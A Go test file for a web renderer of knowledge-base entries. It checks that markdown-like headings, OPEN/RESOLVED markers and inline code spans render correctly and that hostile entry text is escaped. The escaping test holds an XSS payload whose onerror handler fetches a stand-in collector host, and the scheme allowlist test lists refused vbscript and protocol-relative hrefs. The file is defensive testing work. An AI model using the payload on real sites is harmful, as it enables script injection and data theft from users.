// 🔴 THE ASSERTIONS BELOW ARE SCOPED TO THE BODY ELEMENT AND NOT TO THE WHOLE PAGE, WHICH IS
// NOT FASTIDIOUSNESS. The page's own explainer and legend QUOTE the marker grammar —
// "`OPEN:` / `RESOLVED <sha>:` … becomes a badge" — so a whole-page `!Contains(out, "OPEN:")`
// would be red on a correct tree, which is the permanently-red guard this repository refuses.
// What the change actually claims is that the marker is not in the LINE, so the line is what
// is read.
func elementsOf(s, open, close string) []string {
	var out []string
	for {
		i := strings.Index(s, open)
		if i < 0 {
			return out
		}
		s = s[i+len(open):]
		j := strings.Index(s, close)
		if j < 0 {
			return out
		}
		out = append(out, s[:j])
		s = s[j:]
	}
}

// preBodies is [elementsOf] over the `<pre class=class>` bodies, with the `<pre>`'s own
// `<code>` wrapper removed so an assertion compares the TEXT the page shows.
//
// ⚠ THE WRAPPER IS TRIMMED AT THE ENDS AND NOT SEARCHED FOR, BECAUSE AN INLINE SPAN'S
// `</code>` COMES FIRST. A body carrying a code span reads
// `<code>run <code class="inline-code">x</code> first</code>`, so cutting at the first
// `</code>` would truncate the body at the span and every "the text around it survived"
// assertion would be measuring half a line.
// ruleBodyFor returns the DECLARATION BLOCK of the first rule whose selector list names
// `.class`, or "" if there is none.
//
// ⚠ IT IS A BRACE SCAN AND NOT A CSS PARSER, AND ITS LIMIT IS STATED SO NOBODY READS IT
// WIDER. It finds the first `{` after the class name and returns to the matching depth-0 `}`,
// which is exactly right for the flat `@layer components` rules this stylesheet emits and
// would be wrong for a rule whose selector merely contains the name inside a string or a
// comment. `hasSelectorFor` is the guard for "does a rule EXIST"; this one exists for the one
// case where a DECLARATION is load-bearing to a claim the page makes in words.
func ruleBodyFor(css, class string) string {
	loc := regexp.MustCompile(`\.` + regexp.QuoteMeta(class) + `([^A-Za-z0-9_\-]|$)`).FindStringIndex(css)
	if loc == nil {
		return ""
	}
	open := strings.IndexByte(css[loc[0]:], '{')
	if open < 0 {
		return ""
	}
	depth, start := 0, loc[0]+open
	for i := start; i < len(css); i++ {
		switch css[i] {
		case '{':
			depth++
		case '}':
			depth--
			if depth == 0 {
				return css[start : i+1]
			}
		}
	}
	return ""
}

func preBodies(s, class string) []string {
	out := elementsOf(s, `<pre class="`+class+`">`, `</pre>`)
	for i, b := range out {
		out[i] = strings.TrimSuffix(strings.TrimPrefix(b, "<code>"), "</code>")
	}
	return out
}

// TestTheEntryPageShowsHeadingsAndMarkersAsStructureRatherThanText is the REGRESSION test
// for the operator's complaint: the page rendered its own source, `##` runs and `OPEN:`
// prefixes included, instead of reading as a document.
//
// 🔴 IT PINS BOTH DIRECTIONS OF EACH TRANSFORMATION, BECAUSE ONLY ONE OF THEM IS THE
// REGRESSION AND THE OTHER IS THE HAZARD. "The heading text is in an `<h3>`" passes for a
// page that renders `<h3>## What it is</h3>`, which is the defect; "the `##` is gone" passes
// for a page that dropped the heading. Both, or neither means anything.
//
// 🔴 AND THE SHA IS ASSERTED ON THE BADGE, WHICH IS THE ONE PLACE THIS CHANGE COULD HAVE
// LOST INFORMATION OUTRIGHT. `RESOLVED <sha>:` is stripped from the line because the badge
// replaces it, and the sha is what makes the claim checkable at all — so a badge reading
// only `resolved` would have deleted evidence from the page while looking tidier.
func TestTheEntryPageShowsHeadingsAndMarkersAsStructureRatherThanText(t *testing.T) {
	body := strings.Join([]string{
		"- 2000-01-02: OPEN: the lease renewal is still manual",
		"- 2000-01-03: RESOLVED abc1234: the sidecar now renews it",
		"- 2000-01-04: an ordinary bullet",
	}, "\n")
	sections := sectionsFromBody(t, store.NuanceHeading, body)

	// INSTRUMENT CONTROL: the three lines really are in the three populations this test is
	// named for, so the assertions are about rendering and not about a fixture whose lines
	// all mean the same thing.
	wantPopulations := []string{store.PopulationOpen, store.PopulationResolved, store.PopulationNone}
	for i, b := range sections[0].Bullets {
		if b.Population != wantPopulations[i] {
			t.Fatalf("bullet %d parsed as %q, want %q — the fixture does not exercise the distinction",
				i, b.Population, wantPopulations[i])
		}
	}
	if sections[0].Bullets[1].ResolvedBy != "abc1234" {
		t.Fatalf("the RESOLVED bullet carries sha %q, want \"abc1234\"; the badge assertion below would be vacuous",
			sections[0].Bullets[1].ResolvedBy)
	}

	out := entryPageOver(t, sections)

	// --- The heading. ---
	if !strings.Contains(out, `<h3 class="section-head">Nuance / work-history</h3>`) {
		t.Error("the section heading is not rendered as a heading carrying the heading TEXT. The operator's " +
			"complaint was that the page printed the file's own `##` line; an `<h3>` holding `## Nuance / " +
			"work-history` is that same defect wearing a heading element")
	}
	if strings.Contains(out, ">"+store.NuanceHeading+"<") {
		t.Errorf("the literal %q is still rendered as an element's text. The `##` run is the heading now, so "+
			"printing it as well is the verbatim rendering this change replaced", store.NuanceHeading)
	}
	// …and the verbatim line is NOT shown for a canonical heading, or it would appear on
	// every healthy entry and the near-miss signal would mean nothing.
	if strings.Contains(out, `class="section-source"`) {
		t.Error("a CANONICAL `## ` heading rendered the file's verbatim line as well. That annotation exists " +
			"for a heading spelled some other way; on every entry it is noise, and noise is what makes the " +
			"real case invisible")
	}

	// --- The markers. ---
	bodies := preBodies(out, "bullet-body")
	if len(bodies) != 3 {
		t.Fatalf("the page rendered %d bullet bodies, want 3; the assertions below would be about the wrong text", len(bodies))
	}
	joined := strings.Join(bodies, "\n")
	for _, gone := range []string{"OPEN:", "RESOLVED abc1234:", "- ", "2000-01-02"} {
		if strings.Contains(joined, gone) {
			t.Errorf("a bullet body still carries %q, which the badges above it already say. The date, the "+
				"list marker and the openness marker are structure on this page; printing them as well is what "+
				"made it read as a source file.\nbodies: %q", gone, bodies)
		}
	}
	// POSITIVE CONTROL on the strip: the PROSE is still there. A body that lost its marker
	// by losing the whole line would satisfy every assertion above.
	for i, want := range []string{
		"the lease renewal is still manual",
		"the sidecar now renews it",
		"an ordinary bullet",
	} {
		if !strings.Contains(bodies[i], want) {
			t.Errorf("bullet %d's own text is missing: the prefix strip took the line with it.\ngot: %q", i, bodies[i])
		}
	}

	// --- The sha, which the strip removed from the line. ---
	if !strings.Contains(out, `<span class="badge badge-quiet">resolved abc1234</span>`) {
		t.Error("the resolved badge does not name the sha. `RESOLVED <sha>:` was stripped from the line " +
			"because the badge replaces it, so a badge without the sha has deleted the one part of the claim " +
			"a reader can check with `git cat-file -e`")
	}
	if !strings.Contains(out, `<span class="badge badge-open">OPEN</span>`) {
		t.Error("the OPEN badge is absent, so the marker was removed from the line and replaced by nothing")
	}
	t.Logf("entry page: heading rendered as `<h3>Nuance / work-history</h3>` with no `##` text and no "+
		"verbatim annotation; 3 bullet bodies carry their prose and none of [%q %q %q %q]; the resolved badge "+
		"carries sha abc1234", "OPEN:", "RESOLVED abc1234:", "- ", "2000-01-02")
}

// TestAMarkerTheParserCannotReachIsStillOnThePage is the guard the whole design of change 2
// rests on: every transformation is a place the view can disagree with the file, so the
// cases the parser REFUSES must be louder after the change, not quieter.
//
// 🔴 IT IS A REGRESSION TEST AGAINST THIS CHANGE'S OWN HAZARD, WHICH IS WHY IT EXISTS RATHER
// THAN BEING FOLDED INTO THE BADGE TEST. Stripping a marker the parser accepted is safe
// because the badge replaces it. The three cases below are the ones where nothing is
// stripped and therefore nothing replaces anything — and for two of them, the stripping of
// the OTHER cases is precisely what makes them ambiguous: a page that never printed `OPEN:`
// and one that prints it only when it means nothing are indistinguishable to a reader who
// does not already know the rule. So each is asserted PRESENT and NAMED.
func TestAMarkerTheParserCannotReachIsStillOnThePage(t *testing.T) {
	// ⚠ INVARIANT GUARD, NOT REGRESSION COVERAGE — MEASURED, AND LABELLED BECAUSE THE
	// DISTINCTION IS THE HOUSE RULE. This subtest is GREEN at `ac1e8ee`, the commit before the
	// change: the old page printed every line verbatim, so a near miss's marker text was on
	// the page for free and no bug ever violated this. What it pins is that the STRIP did not
	// break it. It is not vacuous — a mutant that cuts `Bullet.Body`'s first line at the first
	// `:` instead of at `store.MarkerSpan` kills it with this message — but it must not be
	// counted as evidence that a defect existed.
	t.Run("a near miss keeps its marker text and its own badge", func(t *testing.T) {
		// `- 2000-01-02 OPEN: …` — the date is not followed by `:`, so `journalOpenness`
		// refuses the line and `store.MarkerSpan` is 0. Nothing is stripped, by construction.
		const line = "- 2000-01-02 OPEN: the lease renewal is still manual"
		sections := sectionsFromBody(t, store.NuanceHeading, line)
		if got := sections[0].Bullets[0].Population; got != store.PopulationNearMiss {
			t.Fatalf("the fixture is population %q, want %q — it is not a near miss and this case measures nothing",
				got, store.PopulationNearMiss)
		}
		if n := store.MarkerSpan(line); n != 0 {
			t.Fatalf("store.MarkerSpan reports a %d-byte marker prefix on a NEAR MISS, so the renderer would "+
				"strip text whose survival is the entire finding", n)
		}
		out := entryPageOver(t, sections)
		if !strings.Contains(out, `<span class="badge badge-near">near-miss marker</span>`) {
			t.Error("a near miss rendered no near-miss badge")
		}
		bodies := preBodies(out, "bullet-body")
		if len(bodies) != 1 || !strings.Contains(bodies[0], "OPEN:") {
			t.Errorf("the near miss's own `OPEN:` text is NOT in the rendered line: %q. A badge naming text "+
				"nobody can read is the state `NearMissCount` exists to end, and a page that strips accepted "+
				"markers makes this the only way a reader can see the difference", bodies)
		}
	})

	t.Run("a marker the parser cannot reach is kept AND called out", func(t *testing.T) {
		// A bullet whose line 1 declares nothing and whose THIRD line spells a correct
		// marker. `BulletOpenness` is anchored at position 0 of line 1, so this declares
		// nothing — `store.UnreachableMarker`'s comment records the field case.
		body := strings.Join([]string{
			"- the lease renewal came up again in review",
			"  and nobody has claimed it since.",
			"  OPEN: the renewal is still manual",
		}, "\n")
		sections := sectionsFromBody(t, store.NuanceHeading, body)
		b := sections[0].Bullets[0]
		if b.Population != store.PopulationNone {
			t.Fatalf("the fixture bullet DECLARED %q: an unreachable marker that reached a population is not "+
				"the case this measures", b.Population)
		}
		if len(b.Unreachable) != 1 || b.Unreachable[0].Offset != 3 {
			t.Fatalf("the store reports %d unreachable marker(s) %+v, want exactly one at offset 3; the "+
				"assertions below would be about nothing", len(b.Unreachable), b.Unreachable)
		}

		out := entryPageOver(t, sections)
		if !strings.Contains(out, `class="bullet-unreachable"`) {
			t.Error("a bullet carrying a correctly-spelled marker on a line no reader looks at rendered NO " +
				"callout. Now that an ACCEPTED marker is stripped from the line, a marker still printed there " +
				"is exactly the shape of one that declared nothing — and silence makes it read as prose")
		}
		notes := elementsOf(out, `<div class="bullet-unreachable">`, `</div>`)
		if len(notes) != 1 {
			t.Fatalf("the page rendered %d unreachable-marker blocks, want 1", len(notes))
		}
		if !strings.Contains(notes[0], "Line 3") {
			t.Errorf("the callout does not name WHICH line, so a reader has a warning and no place to look: %q", notes[0])
		}
		// The line itself must still be there — the callout is the claim, the line is the
		// evidence, and a page with one and not the other is unreadable.
		bodies := preBodies(out, "bullet-body")
		if len(bodies) != 1 || !strings.Contains(bodies[0], "OPEN: the renewal is still manual") {
			t.Errorf("the unreachable marker's own line is not in the rendered body: %q", bodies)
		}
		// NEGATIVE CONTROL: a bullet with NO unreachable marker renders no block, so the
		// presence above is about the marker and not about a block that is always there.
		clean := sectionsFromBody(t, store.NuanceHeading, "- the lease renewal came up again in review")
		if cleanOut := entryPageOver(t, clean); strings.Contains(cleanOut, `class="bullet-unreachable"`) {
			t.Error("a bullet with no unreachable marker still rendered the callout, so its presence above " +
				"says nothing")
		}
	})

	t.Run("a heading spelled some other way still shows the file's own line", func(t *testing.T) {
		// 🔴 THE HEADING HALF OF THE SAME HAZARD. Stripping the `##` run is only lossless
		// because the run is always `"## "` for a heading `readEntry` can produce; the moment
		// it is not, the level the page no longer prints is information the reader has lost.
		// So the renderer reports the run it found instead of assuming one.
		const odd = "#  What it is"
		out := entryPageOver(t, []Section{{Heading: odd, Body: "the lease renewer"}})
		if !strings.Contains(out, `<h3 class="section-head">What it is</h3>`) {
			t.Error("the heading text did not render as a heading")
		}
		sources := elementsOf(out, `<p class="section-source">`, `</p>`)
		if len(sources) != 1 {
			t.Fatalf("a heading whose `#` run is not `## ` rendered %d verbatim annotations, want 1. The page "+
				"no longer prints the run, so a reader cannot otherwise tell a one-hash heading from a two-hash "+
				"one — which is exactly the mapping complaint this page exists to answer", len(sources))
		}
		if !strings.Contains(sources[0], escapeForTest(odd)) {
			t.Errorf("the annotation does not quote the file's own line: %q", sources[0])
		}
		// 🔴 AND THE STYLESHEET HAS TO MAKE IT VERBATIM ON SCREEN, WHICH IS A SEPARATE CLAIM
		// FROM THE BYTES BEING RIGHT. HTML collapses a run of whitespace to one space, so
		// `#  Pointers` and `# Pointers` rendered IDENTICALLY here — in the ONE place on the
		// page whose whole job is to show a heading whose spelling is unusual. The markup was
		// correct the entire time; the defect was visible only in a browser. This pins the
		// `white-space` declaration rather than a spelling of it, because `pre`, `pre-wrap`
		// and `break-spaces` all satisfy the claim and Tailwind may emit any of them.
		rule := ruleBodyFor(string(stylesheet), "section-source")
		if rule == "" {
			t.Fatal("the stylesheet has no `.section-source` rule at all, so the check below is about nothing")
		}
		if !strings.Contains(rule, "white-space: pre") {
			t.Errorf("`.section-source` does not declare a preserving `white-space`, so the line it calls "+
				"VERBATIM is rendered with its whitespace runs collapsed: a heading differing from the "+
				"canonical one only by spacing would look identical to it.\nrule: %s", rule)
		}
	})
}

// TestInlineCodeSpansRenderAsCodeWithoutBecomingMarkup measures the ONE new parse of user
// text this change adds, in both of the contexts that matter.
//
// 🔴 A NEW PARSE OF ATTACKER-AUTHORED TEXT IS A NEW SINK, AND THIS PACKAGE'S DOC COMMENT
// RECORDS THAT TEXT AND ATTRIBUTE POSITIONS FAIL DIFFERENTLY. gomponents escapes text
// content and attribute VALUES but writes an element or attribute NAME verbatim, so the two
// contexts are exercised separately here rather than trusted to one payload: the span's
// inside is text content that the RENDERER chose to wrap, and an entry ref carrying the same
// payload lands in a quoted `href`.
//
// ⚠ THE ESCAPING HALF OF THE LAST SUBTEST IS A CLAIM NO MUTANT IN THIS TREE CAN TEST, AND
// SAYING SO IS THE POINT. `inlineCode` builds only `g.Text` and an attribute-free `h.Code`,
// and `Raw`/`Rawf` are AST-banned by `rawban_test.go` — so the non-escaping mutant that would
// prove the token scan kills it CANNOT BE WRITTEN here. What stands instead is the pair of
// controls: the payload is counted non-zero in the fixture and zero on every rendered page,
// and `TestHostileEntryTextIsEscapedOnEveryBrowsePage`'s structural differential now carries a
// backtick span in both worlds so a span that became markup would move `lt`/`gt`/`="`.
func TestInlineCodeSpansRenderAsCodeWithoutBecomingMarkup(t *testing.T) {
	t.Run("a span renders as code and its backticks do not", func(t *testing.T) {
		out := entryPageOver(t, []Section{{Heading: store.WhatHeading, Body: "run `cairn recall --ref lease` first"}})
		if !strings.Contains(out, `<code class="inline-code">cairn recall --ref lease</code>`) {
			t.Error("a single-backtick span did not render as code. The operator's complaint named this " +
				"explicitly: the page showed the backticks instead of the code")
		}
		bodies := preBodies(out, "section-body")
		if len(bodies) != 1 {
			t.Fatalf("the page rendered %d section bodies, want 1", len(bodies))
		}
		if strings.Contains(bodies[0], "`") {
			t.Errorf("a matched backtick pair is still printed: %q", bodies[0])
		}
		if !strings.Contains(bodies[0], "run ") || !strings.Contains(bodies[0], " first") {
			t.Errorf("the text around the span was lost: %q", bodies[0])
		}
	})

	// ⚠ THE NEXT TWO ARE INVARIANT GUARDS, AND THE LABEL IS MEASURED RATHER THAN ASSUMED. Both
	// are GREEN at `ac1e8ee`: the old page printed the body verbatim, so a stray backtick and
	// an empty pair survived for free and no bug ever violated either. They pin that the new
	// PARSE did not start editing text, which is a claim about this change and not about a
	// defect — and each is killed by its own mutant (close an unterminated span at
	// end-of-line; treat an empty pair as a span), so neither is vacuous.
	t.Run("an unmatched backtick is left exactly as typed", func(t *testing.T) {
		// 🔴 THE "DO NOT LOSE INFORMATION" RULE AT SPAN LEVEL, AND THE FAILURE IT REFUSES IS
		// INVISIBLE BY CONSTRUCTION: a renderer that closed an unterminated span at
		// end-of-line, or swallowed the character, edits a writer's text — and nobody notices,
		// because a backtick is the one character a reader has stopped expecting to see.
		const body = "the flag is `--ref and the default is none"
		out := entryPageOver(t, []Section{{Heading: store.WhatHeading, Body: body}})
		bodies := preBodies(out, "section-body")
		if len(bodies) != 1 {
			t.Fatalf("the page rendered %d section bodies, want 1", len(bodies))
		}
		if bodies[0] != escapeForTest(body) {
			t.Errorf("a line with ONE backtick was rewritten.\n got: %q\nwant: %q", bodies[0], escapeForTest(body))
		}
		if strings.Contains(bodies[0], "inline-code") {
			t.Error("an unterminated span produced a code element, so the parser closed a span the writer did not")
		}
	})

	t.Run("an empty pair is two characters, not a span", func(t *testing.T) {
		const body = "a doubled `` backtick pair"
		out := entryPageOver(t, []Section{{Heading: store.WhatHeading, Body: body}})
		bodies := preBodies(out, "section-body")
		if len(bodies) != 1 || bodies[0] != escapeForTest(body) {
			t.Errorf("an empty backtick pair was rewritten.\n got: %q\nwant: %q", bodies, escapeForTest(body))
		}
	})

	t.Run("nothing inside a code fence is touched", func(t *testing.T) {
		// The same ruling `ParseJournalBullets` and `UnreachableMarkers` already make about a
		// `- OPEN:` inside a fence: fenced content is sample text, and reading the fence with
		// `store.IsFence` is what keeps this renderer from disagreeing with them about what a
		// fence is.
		body := strings.Join([]string{
			"before `real` span",
			"```",
			"echo `not a span`",
			"```",
			"after",
		}, "\n")
		out := entryPageOver(t, []Section{{Heading: store.WhatHeading, Body: body}})
		bodies := preBodies(out, "section-body")
		if len(bodies) != 1 {
			t.Fatalf("the page rendered %d section bodies, want 1", len(bodies))
		}
		if n := strings.Count(bodies[0], "inline-code"); n != 1 {
			t.Errorf("the body rendered %d inline-code span(s), want exactly 1 — the fenced backticks are "+
				"sample text and must survive as characters: %q", n, bodies[0])
		}
		if !strings.Contains(bodies[0], "echo `not a span`") {
			t.Errorf("the fenced line's backticks were consumed: %q", bodies[0])
		}
	})

	t.Run("a payload inside a span cannot become markup, in text OR attribute position", func(t *testing.T) {
		// TEXT POSITION: inside the span, which is the node `inlineCode` creates.
		// ATTRIBUTE POSITION: the same payload as an entry REF, which reaches a quoted `href`
		// through `entryHref` — a different failure mode, per this package's doc comment.
		const payload = "`</code><img src=x onerror=\"fetch('//collector.invalid/c')\">`"
		// POSITIVE CONTROL on the scanner: the payload really does carry something the token
		// list recognises, so a zero below is a measurement.
		if n := countTokens(payload); n == 0 {
			t.Fatal("POSITIVE CONTROL FAILED: the payload carries nothing `dangerousTokens` matches, so a " +
				"zero on the rendered page would mean nothing")
		}

		world := benignWorld()
		world[0].Entries[0].Ref = "lease" + payload
		world[0].Entries[0].Sections = []Section{{Heading: store.WhatHeading, Body: "the flag is " + payload}}
		view := viewOf("operator@example.invalid", world)
		view.Scope = &world[0]
		view.Entry = &world[0].Entries[0]
		pages := map[string]string{
			"entry": renderNode(t, EntryPage(view)),
			"scope": renderNode(t, ScopePage(view)),
		}
		for name, out := range pages {
			for _, tok := range dangerousTokens {
				if n := strings.Count(strings.ToLower(out), strings.ToLower(tok)); n > 0 {
					t.Errorf("the %s page carries %d occurrence(s) of %q, which this renderer never emits: it "+
						"came out of a backtick span or out of a ref in an href position", name, n, tok)
				}
			}
		}
		// …and INERT rather than DROPPED, in both positions.
		inner := `</code><img src=x onerror="fetch('//collector.invalid/c')">`
		if !strings.Contains(pages["entry"], `<code class="inline-code">`+escapeForTest(inner)+`</code>`) {
			t.Error("the span's payload is not on the entry page as escaped code-element content: it was " +
				"DROPPED rather than rendered inert, which hides what the file says")
		}
		if !strings.Contains(pages["scope"], escapeForTest("lease"+payload)) {
			t.Error("the hostile REF is not on the scope page as escaped text, so the attribute-position half " +
				"of this case is satisfied by a page that dropped it")
		}
		t.Logf("inline code: 0 of %d dangerous token(s) rendered as markup over 2 pages; the payload is "+
			"present and escaped in both the span (text content) and the ref (attribute) positions",
			len(dangerousTokens))
	})
}

// escapeForTest is the hand-written escaping the assertions above compare against —
// deliberately NOT `template.HTMLEscapeString`, so the expectation is not derived
// from the same function the renderer uses.
func escapeForTest(s string) string {
	r := strings.NewReplacer(
		"&", "&amp;",
		"<", "&lt;",
		">", "&gt;",
		`"`, "&#34;",
		"'", "&#39;",
	)
	return r.Replace(s)
}

// TestSafeHrefAllowlistsSchemes measures [safeHref] directly, at more than one point
// on every dimension it branches on.
func TestSafeHrefAllowlistsSchemes(t *testing.T) {
	permitted := []string{
		"https://tracker.invalid/issue/1",
		"http://tracker.invalid/issue/1",
		"HTTPS://tracker.invalid/issue/1",
		"  https://tracker.invalid/issue/1  ",
	}
	refused := []string{
		hostileTaskScript,
		hostileTaskMixedCase,
		hostileTaskData,
		"",
		"   ",
		"jira:PLAT-14",             // an ordinary task ref, which is NOT a URL
		"/entries",                 // same-origin: refused on purpose, see allowedSchemes
		"//collector.invalid/x",    // protocol-relative
		"vbscript:msgbox(1)",       //
		"httpsx://tracker.invalid", // a scheme that merely starts with a permitted one
		"https:/tracker.invalid",   // one slash: not the `https://` prefix
	}
	for _, in := range permitted {
		got, ok := safeHref(in)
		if !ok {
			t.Errorf("safeHref refused a permitted URL %q", in)
			continue
		}
		if strings.TrimSpace(in) != got {
			t.Errorf("safeHref(%q) returned %q; it must return the stripped input unchanged", in, got)
		}
	}
	for _, in := range refused {
		if got, ok := safeHref(in); ok {
			t.Errorf("safeHref PERMITTED %q (returned %q). Every entry in this list is either not a URL at all "+
				"or a scheme a browser will act on, and permitting one puts it in an href built from store content.",
				in, got)
		}
	}
	t.Logf("safeHref: %d permitted, %d refused", len(permitted), len(refused))
}

// TestAnEmptyWorldRendersAnAuthorityAnswer pins that "nothing visible" is stated
// rather than rendered as a blank page — an empty result cannot distinguish an empty
// store from a credential with no scopes, and the page must not imply the first.
func TestAnEmptyWorldRendersAnAuthorityAnswer(t *testing.T) {
	out := render(t, "operator@example.invalid", nil)
	if !strings.Contains(out, "No scope is visible to this credential") {
		t.Error("an empty world rendered no explanation, so a reader cannot tell an empty store from a narrow credential")
	}
	if !strings.Contains(out, "operator@example.invalid") {
		t.Error("the viewer's display name is missing from the page")
	}
}

// rawViewOf is [PageView] with the raw view selected, so the differential can render the
// same page in both of its states without either caller knowing how the switch is spelled.
func rawViewOf(v PageView) PageView {
	v.RawView = true
	return v
}
